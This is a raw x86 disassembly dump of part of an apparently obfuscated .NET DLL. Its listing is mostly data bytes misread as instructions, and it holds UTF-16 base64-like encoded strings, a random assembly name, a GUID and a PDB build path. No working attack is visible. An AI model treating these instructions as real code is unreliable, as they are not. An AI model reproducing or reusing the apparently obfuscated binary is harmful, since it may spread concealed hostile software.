10004cc9:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004ccd:	00 53 00             	add    %dl,0x0(%ebx)
10004cd0:	55                   	push   %ebp
10004cd1:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004cd5:	00 53 00             	add    %dl,0x0(%ebx)
10004cd8:	54                   	push   %esp
10004cd9:	00 63 00             	add    %ah,0x0(%ebx)
10004cdc:	35 00 55 00 6e       	xor    $0x6e005500,%eax
10004ce1:	00 68 00             	add    %ch,0x0(%eax)
10004ce4:	50                   	push   %eax
10004ce5:	00 56 00             	add    %dl,0x0(%esi)
10004ce8:	6c                   	insb   (%dx),%es:(%edi)
10004ce9:	00 4e 00             	add    %cl,0x0(%esi)
10004cec:	5a                   	pop    %edx
10004ced:	00 53 00             	add    %dl,0x0(%ebx)
10004cf0:	55                   	push   %ebp
10004cf1:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004cf5:	00 61 00             	add    %ah,0x0(%ecx)
10004cf8:	30 00                	xor    %al,(%eax)
10004cfa:	6b 00 33             	imul   $0x33,(%eax),%eax
10004cfd:	00 4f 00             	add    %cl,0x0(%edi)
10004d00:	56                   	push   %esi
10004d01:	00 4a 00             	add    %cl,0x0(%edx)
10004d04:	54                   	push   %esp
10004d05:	00 57 00             	add    %dl,0x0(%edi)
10004d08:	55                   	push   %ebp
10004d09:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004d0d:	00 52 00             	add    %dl,0x0(%edx)
10004d10:	32 00                	xor    (%eax),%al
10004d12:	74 00                	je     0x10004d14
10004d14:	4a                   	dec    %edx
10004d15:	00 4e 00             	add    %cl,0x0(%esi)
10004d18:	7a 00                	jp     0x10004d1a
10004d1a:	6c                   	insb   (%dx),%es:(%edi)
10004d1b:	00 53 00             	add    %dl,0x0(%ebx)
10004d1e:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004d22:	4e                   	dec    %esi
10004d23:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004d27:	00 55 00             	add    %dl,0x0(%ebp)
10004d2a:	6c                   	insb   (%dx),%es:(%edi)
10004d2b:	00 4a 00             	add    %cl,0x0(%edx)
10004d2e:	52                   	push   %edx
10004d2f:	00 32                	add    %dh,(%edx)
10004d31:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
10004d35:	00 4e 00             	add    %cl,0x0(%esi)
10004d38:	7a 00                	jp     0x10004d3a
10004d3a:	6c                   	insb   (%dx),%es:(%edi)
10004d3b:	00 53 00             	add    %dl,0x0(%ebx)
10004d3e:	00 15 53 00 59 00    	add    %dl,0x590053
10004d44:	49                   	dec    %ecx
10004d45:	00 49 00             	add    %cl,0x0(%ecx)
10004d48:	47                   	inc    %edi
10004d49:	00 6b 00             	add    %ch,0x0(%ebx)
10004d4c:	49                   	dec    %ecx
10004d4d:	00 37                	add    %dh,(%edi)
10004d4f:	00 39                	add    %bh,(%ecx)
10004d51:	00 52 00             	add    %dl,0x0(%edx)
10004d54:	00 80 b9 61 00 47    	add    %al,0x470061b9(%eax)
10004d5a:	00 45 00             	add    %al,0x0(%ebp)
10004d5d:	32 00                	xor    (%eax),%al
10004d5f:	5a                   	pop    %edx
10004d60:	00 47 00             	add    %al,0x0(%edi)
10004d63:	70 00                	jo     0x10004d65
10004d65:	34 00                	xor    $0x0,%al
10004d67:	62 00                	bound  %eax,(%eax)
10004d69:	7a 00                	jp     0x10004d6b
10004d6b:	56                   	push   %esi
10004d6c:	00 43 00             	add    %al,0x0(%ebx)
10004d6f:	53                   	push   %ebx
10004d70:	00 55 00             	add    %dl,0x0(%ebp)
10004d73:	74 00                	je     0x10004d75
10004d75:	70 00                	jo     0x10004d77
10004d77:	4e                   	dec    %esi
10004d78:	00 57 00             	add    %dl,0x0(%edi)
10004d7b:	68 00 68 00 4e       	push   $0x4e006800
10004d80:	00 6d 00             	add    %ch,0x0(%ebp)
10004d83:	52                   	push   %edx
10004d84:	00 71 00             	add    %dh,0x0(%ecx)
10004d87:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004d8b:	38 00                	cmp    %al,(%eax)
10004d8d:	31 00                	xor    %eax,(%eax)
10004d8f:	51                   	push   %ecx
10004d90:	00 6b 00             	add    %ch,0x0(%ebx)
10004d93:	6c                   	insb   (%dx),%es:(%edi)
10004d94:	00 6f 00             	add    %ch,0x0(%edi)
10004d97:	59                   	pop    %ecx
10004d98:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004d9c:	00 6b 00             	add    %ch,0x0(%ebx)
10004d9f:	61                   	popa
10004da0:	00 6e 00             	add    %ch,0x0(%esi)
10004da3:	68 00 76 00 4e       	push   $0x4e007600
10004da8:	00 55 00             	add    %dl,0x0(%ebp)
10004dab:	4a                   	dec    %edx
10004dac:	00 4a 00             	add    %cl,0x0(%edx)
10004daf:	62 00                	bound  %eax,(%eax)
10004db1:	47                   	inc    %edi
10004db2:	00 56 00             	add    %dl,0x0(%esi)
10004db5:	48                   	dec    %eax
10004db6:	00 61 00             	add    %ah,0x0(%ecx)
10004db9:	47                   	inc    %edi
10004dba:	00 45 00             	add    %al,0x0(%ebp)
10004dbd:	32 00                	xor    (%eax),%al
10004dbf:	5a                   	pop    %edx
10004dc0:	00 47 00             	add    %al,0x0(%edi)
10004dc3:	70 00                	jo     0x10004dc5
10004dc5:	34 00                	xor    $0x0,%al
10004dc7:	62 00                	bound  %eax,(%eax)
10004dc9:	7a 00                	jp     0x10004dcb
10004dcb:	56                   	push   %esi
10004dcc:	00 43 00             	add    %al,0x0(%ebx)
10004dcf:	53                   	push   %ebx
10004dd0:	00 57 00             	add    %dl,0x0(%edi)
10004dd3:	68 00 68 00 4e       	push   $0x4e006800
10004dd8:	00 6d 00             	add    %ch,0x0(%ebp)
10004ddb:	52                   	push   %edx
10004ddc:	00 71 00             	add    %dh,0x0(%ecx)
10004ddf:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004de3:	38 00                	cmp    %al,(%eax)
10004de5:	31 00                	xor    %eax,(%eax)
10004de7:	51                   	push   %ecx
10004de8:	00 6b 00             	add    %ch,0x0(%ebx)
10004deb:	6c                   	insb   (%dx),%es:(%edi)
10004dec:	00 56 00             	add    %dl,0x0(%esi)
10004def:	50                   	push   %eax
10004df0:	00 57 00             	add    %dl,0x0(%edi)
10004df3:	68 00 68 00 4e       	push   $0x4e006800
10004df8:	00 6d 00             	add    %ch,0x0(%ebp)
10004dfb:	52                   	push   %edx
10004dfc:	00 71 00             	add    %dh,0x0(%ecx)
10004dff:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004e03:	38 00                	cmp    %al,(%eax)
10004e05:	31 00                	xor    %eax,(%eax)
10004e07:	51                   	push   %ecx
10004e08:	00 6b 00             	add    %ch,0x0(%ebx)
10004e0b:	6b 00 3d             	imul   $0x3d,(%eax),%eax
10004e0e:	00 00                	add    %al,(%eax)
10004e10:	15 68 00 61 00       	adc    $0x610068,%eax
10004e15:	36 00 64 00 6a       	add    %ah,%ss:0x6a(%eax,%eax,1)
10004e1a:	00 78 00             	add    %bh,0x0(%eax)
10004e1d:	6f                   	outsl  %ds:(%esi),(%dx)
10004e1e:	00 35 00 42 00 49    	add    %dh,0x49004200
10004e24:	00 00                	add    %al,(%eax)
10004e26:	00 00                	add    %al,(%eax)
10004e28:	e2 64                	loop   0x10004e8e
10004e2a:	ea 17 82 fa 2c 41 9f 	ljmp   $0x9f41,$0x2cfa8217
10004e31:	39 e1                	cmp    %esp,%ecx
10004e33:	7b 9b                	jnp    0x10004dd0
10004e35:	b7 ba                	mov    $0xba,%bh
10004e37:	77 00                	ja     0x10004e39
10004e39:	04 20                	add    $0x20,%al
10004e3b:	01 01                	add    %eax,(%ecx)
10004e3d:	08 03                	or     %al,(%ebx)
10004e3f:	20 00                	and    %al,(%eax)
10004e41:	01 05 20 01 01 11    	add    %eax,0x11010120
10004e47:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004e4a:	01 01                	add    %eax,(%ecx)
10004e4c:	0e                   	push   %cs
10004e4d:	04 20                	add    $0x20,%al
10004e4f:	01 01                	add    %eax,(%ecx)
10004e51:	02 0c 07             	add    (%edi,%eax,1),%cl
10004e54:	07                   	pop    %es
10004e55:	11 10                	adc    %edx,(%eax)
10004e57:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
10004e5a:	18 18                	sbb    %bl,(%eax)
10004e5c:	12 45 09             	adc    0x9(%ebp),%al
10004e5f:	06                   	push   %es
10004e60:	10 01                	adc    %al,(%ecx)
10004e62:	01 08                	add    %ecx,(%eax)
10004e64:	1e                   	push   %ds
10004e65:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004e68:	01 11                	add    %edx,(%ecx)
10004e6a:	10 02                	adc    %al,(%edx)
10004e6c:	06                   	push   %es
10004e6d:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004e73:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004e76:	00 12                	add    %dl,(%edx)
10004e78:	61                   	popa
10004e79:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e7e:	0e                   	push   %cs
10004e7f:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e84:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e89:	0e                   	push   %cs
10004e8a:	0e                   	push   %cs
10004e8b:	04 00                	add    $0x0,%al
10004e8d:	01 01                	add    %eax,(%ecx)
10004e8f:	08 05 00 01 12 45    	or     %al,0x45120100
10004e95:	08 03                	or     %al,(%ebx)
10004e97:	20 00                	and    %al,(%eax)
10004e99:	02 06                	add    (%esi),%al
10004e9b:	07                   	pop    %es
10004e9c:	02 12                	add    (%edx),%dl
10004e9e:	14 1d                	adc    $0x1d,%al
10004ea0:	0e                   	push   %cs
10004ea1:	05 15 12 55 01       	add    $0x1551215,%eax
10004ea6:	0e                   	push   %cs
10004ea7:	05 20 01 01 13       	add    $0x13010120,%eax
10004eac:	00 08                	add    %cl,(%eax)
10004eae:	00 03                	add    %al,(%ebx)
10004eb0:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004eb5:	75 06                	jne    0x10004ebd
10004eb7:	15 12 79 02 0e       	adc    $0xe027912,%eax
10004ebc:	02 05 20 02 01 1c    	add    0x1c010220,%al
10004ec2:	18 18                	sbb    %bl,(%eax)
10004ec4:	10 01                	adc    %al,(%ecx)
10004ec6:	02 15 12 80 81 01    	add    0x1818012,%dl
10004ecc:	1e                   	push   %ds
10004ecd:	00 15 12 80 81 01    	add    %dl,0x1818012
10004ed3:	1e                   	push   %ds
10004ed4:	00 15 12 79 02 1e    	add    %dl,0x1e027912
10004eda:	00 02                	add    %al,(%edx)
10004edc:	03 0a                	add    (%edx),%ecx
10004ede:	01 0e                	add    %ecx,(%esi)
10004ee0:	0d 10 01 01 1d       	or     $0x1d010110,%eax
10004ee5:	1e                   	push   %ds
10004ee6:	00 15 12 80 81 01    	add    %dl,0x1818012
10004eec:	1e                   	push   %ds
10004eed:	00 04 20             	add    %al,(%eax,%eiz,1)
10004ef0:	01 08                	add    %ecx,(%eax)
10004ef2:	08 04 00             	or     %al,(%eax,%eax,1)
10004ef5:	01 0e                	add    %ecx,(%esi)
10004ef7:	0e                   	push   %cs
10004ef8:	05 20 01 02 13       	add    $0x13020120,%eax
10004efd:	00 08                	add    %cl,(%eax)
10004eff:	b7 7a                	mov    $0x7a,%bh
10004f01:	5c                   	pop    %esp
10004f02:	56                   	push   %esi
10004f03:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004f06:	89 02                	mov    %eax,(%edx)
10004f08:	06                   	push   %es
10004f09:	09 02                	or     %eax,(%edx)
10004f0b:	06                   	push   %es
10004f0c:	0e                   	push   %cs
10004f0d:	02 06                	add    (%esi),%al
10004f0f:	08 02                	or     %al,(%edx)
10004f11:	06                   	push   %es
10004f12:	06                   	push   %es
10004f13:	06                   	push   %es
10004f14:	06                   	push   %es
10004f15:	15 12 55 01 0e       	adc    $0xe015512,%eax
10004f1a:	0b 00                	or     (%eax),%eax
10004f1c:	07                   	pop    %es
10004f1d:	18 18                	sbb    %bl,(%eax)
10004f1f:	18 09                	sbb    %cl,(%ecx)
10004f21:	18 18                	sbb    %bl,(%eax)
10004f23:	09 10                	or     %edx,(%eax)
10004f25:	18 11                	sbb    %dl,(%ecx)
10004f27:	00 0a                	add    %cl,(%edx)
10004f29:	02 0e                	add    (%esi),%cl
10004f2b:	0e                   	push   %cs
10004f2c:	18 18                	sbb    %bl,(%eax)
10004f2e:	02 09                	add    (%ecx),%cl
10004f30:	18 0e                	sbb    %cl,(%esi)
10004f32:	10 11                	adc    %dl,(%ecx)
10004f34:	10 10                	adc    %dl,(%eax)
10004f36:	11 0c 04             	adc    %ecx,(%esp,%eax,1)
10004f39:	00 01                	add    %al,(%ecx)
10004f3b:	02 18                	add    (%eax),%bl
10004f3d:	0a 00                	or     (%eax),%al
10004f3f:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004f44:	05 09 10 18 06       	add    $0x6181009,%eax
10004f49:	00 02                	add    %al,(%edx)
10004f4b:	01 0e                	add    %ecx,(%esi)
10004f4d:	1d 05 08 00 05       	sbb    $0x5000805,%eax
10004f52:	18 18                	sbb    %bl,(%eax)
10004f54:	18 09                	sbb    %cl,(%ecx)
10004f56:	09 09                	or     %ecx,(%ecx)
10004f58:	06                   	push   %es
10004f59:	00 02                	add    %al,(%edx)
10004f5b:	02 18                	add    (%eax),%bl
10004f5d:	10 09                	adc    %cl,(%ecx)
10004f5f:	03 00                	add    (%eax),%eax
10004f61:	00 0e                	add    %cl,(%esi)
10004f63:	04 20                	add    $0x20,%al
10004f65:	01 02                	add    %eax,(%edx)
10004f67:	0e                   	push   %cs
10004f68:	08 01                	or     %al,(%ecx)
10004f6a:	00 08                	add    %cl,(%eax)
10004f6c:	00 00                	add    %al,(%eax)
10004f6e:	00 00                	add    %al,(%eax)
10004f70:	00 1e                	add    %bl,(%esi)
10004f72:	01 00                	add    %eax,(%eax)
10004f74:	01 00                	add    %eax,(%eax)
10004f76:	54                   	push   %esp
10004f77:	02 16                	add    (%esi),%dl
10004f79:	57                   	push   %edi
10004f7a:	72 61                	jb     0x10004fdd
10004f7c:	70 4e                	jo     0x10004fcc
10004f7e:	6f                   	outsl  %ds:(%esi),(%dx)
10004f7f:	6e                   	outsb  %ds:(%esi),(%dx)
10004f80:	45                   	inc    %ebp
10004f81:	78 63                	js     0x10004fe6
10004f83:	65 70 74             	gs jo  0x10004ffa
10004f86:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004f8d:	77 73                	ja     0x10005002
10004f8f:	01 08                	add    %ecx,(%eax)
10004f91:	01 00                	add    %eax,(%eax)
10004f93:	02 00                	add    (%eax),%al
10004f95:	00 00                	add    %al,(%eax)
10004f97:	00 00                	add    %al,(%eax)
10004f99:	13 01                	adc    (%ecx),%eax
10004f9b:	00 0e                	add    %cl,(%esi)
10004f9d:	4c                   	dec    %esp
10004f9e:	66 74 6d             	data16 je 0x1000500e
10004fa1:	6e                   	outsb  %ds:(%esi),(%dx)
10004fa2:	68 56 37 6e 6a       	push   $0x6a6e3756
10004fa7:	53                   	push   %ebx
10004fa8:	65 78 43             	gs js  0x10004fee
10004fab:	00 00                	add    %al,(%eax)
10004fad:	05 01 00 00 00       	add    $0x1,%eax
10004fb2:	00 17                	add    %dl,(%edi)
10004fb4:	01 00                	add    %eax,(%eax)
10004fb6:	12 43 6f             	adc    0x6f(%ebx),%al
10004fb9:	70 79                	jo     0x10005034
10004fbb:	72 69                	jb     0x10005026
10004fbd:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004fc3:	20 20                	and    %ah,(%eax)
10004fc5:	32 30                	xor    (%eax),%dh
10004fc7:	32 34 00             	xor    (%eax,%eax,1),%dh
10004fca:	00 29                	add    %ch,(%ecx)
10004fcc:	01 00                	add    %eax,(%eax)
10004fce:	24 39                	and    $0x39,%al
10004fd0:	41                   	inc    %ecx
10004fd1:	43                   	inc    %ebx
10004fd2:	43                   	inc    %ebx
10004fd3:	34 39                	xor    $0x39,%al
10004fd5:	33 31                	xor    (%ecx),%esi
10004fd7:	2d 32 37 41 41       	sub    $0x41413732,%eax
10004fdc:	2d 34 36 35 34       	sub    $0x34353634,%eax
10004fe1:	2d 42 30 35 43       	sub    $0x43353042,%eax
10004fe6:	2d 42 35 42 45       	sub    $0x45423542,%eax
10004feb:	37                   	aaa
10004fec:	43                   	inc    %ebx
10004fed:	34 38                	xor    $0x38,%al
10004fef:	46                   	inc    %esi
10004ff0:	46                   	inc    %esi
10004ff1:	35 37 00 00 0c       	xor    $0xc000037,%eax
10004ff6:	01 00                	add    %eax,(%eax)
10004ff8:	07                   	pop    %es
10004ff9:	31 2e                	xor    %ebp,(%esi)
10004ffb:	30 2e                	xor    %ch,(%esi)
10004ffd:	30 2e                	xor    %ch,(%esi)
10004fff:	30 00                	xor    %al,(%eax)
10005001:	00 49 01             	add    %cl,0x1(%ecx)
10005004:	00 1a                	add    %bl,(%edx)
10005006:	2e 4e                	cs dec %esi
10005008:	45                   	inc    %ebp
10005009:	54                   	push   %esp
1000500a:	46                   	inc    %esi
1000500b:	72 61                	jb     0x1000506e
1000500d:	6d                   	insl   (%dx),%es:(%edi)
1000500e:	65 77 6f             	gs ja  0x10005080
10005011:	72 6b                	jb     0x1000507e
10005013:	2c 56                	sub    $0x56,%al
10005015:	65 72 73             	gs jb  0x1000508b
10005018:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
1000501f:	38 01                	cmp    %al,(%ecx)
10005021:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10005025:	46                   	inc    %esi
10005026:	72 61                	jb     0x10005089
10005028:	6d                   	insl   (%dx),%es:(%edi)
10005029:	65 77 6f             	gs ja  0x1000509b
1000502c:	72 6b                	jb     0x10005099
1000502e:	44                   	inc    %esp
1000502f:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10005036:	61                   	popa
10005037:	6d                   	insl   (%dx),%es:(%edi)
10005038:	65 12 2e             	adc    %gs:(%esi),%ch
1000503b:	4e                   	dec    %esi
1000503c:	45                   	inc    %ebp
1000503d:	54                   	push   %esp
1000503e:	20 46 72             	and    %al,0x72(%esi)
10005041:	61                   	popa
10005042:	6d                   	insl   (%dx),%es:(%edi)
10005043:	65 77 6f             	gs ja  0x100050b5
10005046:	72 6b                	jb     0x100050b3
10005048:	20 34 2e             	and    %dh,(%esi,%ebp,1)
1000504b:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
10005056:	00 00                	add    %al,(%eax)
10005058:	21 da                	and    %ebx,%edx
1000505a:	25 ea 00 00 00       	and    $0xea,%eax
1000505f:	00 02                	add    %al,(%edx)
10005061:	00 00                	add    %al,(%eax)
10005063:	00 5b 00             	add    %bl,0x0(%ebx)
10005066:	00 00                	add    %al,(%eax)
10005068:	8c 50 00             	mov    %ss,0x0(%eax)
1000506b:	00 8c 32 00 00 00 00 	add    %cl,0x0(%edx,%esi,1)
	...
1000507a:	00 00                	add    %al,(%eax)
1000507c:	10 00                	adc    %al,(%eax)
	...
1000508a:	00 00                	add    %al,(%eax)
1000508c:	52                   	push   %edx
1000508d:	53                   	push   %ebx
1000508e:	44                   	inc    %esp
1000508f:	53                   	push   %ebx
10005090:	2b e2                	sub    %edx,%esp
10005092:	f2 1e                	repnz push %ds
10005094:	b2 7e                	mov    $0x7e,%dl
10005096:	55                   	push   %ebp
10005097:	43                   	inc    %ebx
10005098:	90                   	nop
10005099:	e3 d6                	jecxz  0x10005071
1000509b:	89 6e e7             	mov    %ebp,-0x19(%esi)
1000509e:	73 6e                	jae    0x1000510e
100050a0:	01 00                	add    %eax,(%eax)
100050a2:	00 00                	add    %al,(%eax)
100050a4:	43                   	inc    %ebx
100050a5:	3a 5c 61 70          	cmp    0x70(%ecx,%eiz,2),%bl
100050a9:	70 5c                	jo     0x10005107
100050ab:	61                   	popa
100050ac:	73 73                	jae    0x10005121
100050ae:	65 74 73             	gs je  0x10005124
100050b1:	5c                   	pop    %esp
100050b2:	62 69 6e             	bound  %ebp,0x6e(%ecx)
100050b5:	5c                   	pop    %esp
100050b6:	74 65                	je     0x1000511d
100050b8:	6d                   	insl   (%dx),%es:(%edi)
100050b9:	70 2d                	jo     0x100050e8
100050bb:	62 39                	bound  %edi,(%ecx)
100050bd:	36 36 63 61 39       	ss arpl %esp,%ss:0x39(%ecx)
100050c2:	32 34 36             	xor    (%esi,%esi,1),%dh
100050c5:	63 37                	arpl   %esi,(%edi)
100050c7:	5c                   	pop    %esp
100050c8:	6f                   	outsl  %ds:(%esi),(%dx)
100050c9:	62 6a 5c             	bound  %ebp,0x5c(%edx)
100050cc:	52                   	push   %edx
100050cd:	65 6c                	gs insb (%dx),%es:(%edi)
100050cf:	65 61                	gs popa
100050d1:	73 65                	jae    0x10005138
100050d3:	5c                   	pop    %esp
100050d4:	4c                   	dec    %esp
100050d5:	66 74 6d             	data16 je 0x10005145
100050d8:	6e                   	outsb  %ds:(%esi),(%dx)
100050d9:	68 56 37 6e 6a       	push   $0x6a6e3756
100050de:	53                   	push   %ebx
100050df:	65 78 43             	gs js  0x10005125
100050e2:	2e 70 64             	jo,pn  0x10005149
100050e5:	62 00                	bound  %eax,(%eax)
100050e7:	0f 51 00             	sqrtps (%eax),%xmm0
	...
100050f2:	00 29                	add    %ch,(%ecx)
100050f4:	51                   	push   %ecx
100050f5:	00 00                	add    %al,(%eax)
100050f7:	00 20                	add    %ah,(%eax)
	...
1000510d:	00 00                	add    %al,(%eax)
1000510f:	1b 51 00             	sbb    0x0(%ecx),%edx
	...
1000511a:	00 00                	add    %al,(%eax)
1000511c:	00 5f 43             	add    %bl,0x43(%edi)
1000511f:	6f                   	outsl  %ds:(%esi),(%dx)
10005120:	72 44                	jb     0x10005166
10005122:	6c                   	insb   (%dx),%es:(%edi)
10005123:	6c                   	insb   (%dx),%es:(%edi)
10005124:	4d                   	dec    %ebp
10005125:	61                   	popa
10005126:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
1000512d:	72 65                	jb     0x10005194
1000512f:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10005133:	6c                   	insb   (%dx),%es:(%edi)
10005134:	00 00                	add    %al,(%eax)
10005136:	00 00                	add    %al,(%eax)
10005138:	00 00                	add    %al,(%eax)
1000513a:	ff 25 00 20 00 10    	jmp    *0x10002000
